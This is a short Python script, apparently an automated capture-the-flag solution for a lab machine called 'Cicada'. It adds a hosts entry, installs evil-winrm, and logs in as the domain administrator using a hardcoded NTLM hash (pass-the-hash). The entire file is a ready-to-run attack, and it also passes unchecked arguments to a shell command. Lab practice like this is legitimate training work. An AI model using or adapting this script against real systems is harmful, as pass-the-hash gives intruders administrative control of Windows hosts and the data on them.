import os
import sys
import subprocess
import string
import random

print("\n[\033[1;32m+\033[1;37m] Cicada - Ninhpn1337 - Need root to write hosts file \n")
def check_privileges():

    if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
        raise PermissionError("You need to run this script with sudo or as root.")

bashfile=''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
bashfile='/tmp/'+bashfile+'.sh'

f = open(bashfile, 'w')
s = """sudo -- sh -c -e "echo '10.10.11.35 cicada.htb' >> /etc/hosts";
sudo apt-get install evil-winrm
evil-winrm -I cicada.htb -u "administrator@cicada.htb" -H 2b87e7c93a3e8a0ea4a581937016f341
"""
f.write(s)
f.close()
os.chmod(bashfile, 0o755)
bashcmd=bashfile
for arg in sys.argv[1:]:
  bashcmd += ' '+arg
subprocess.call(bashcmd, shell=True)
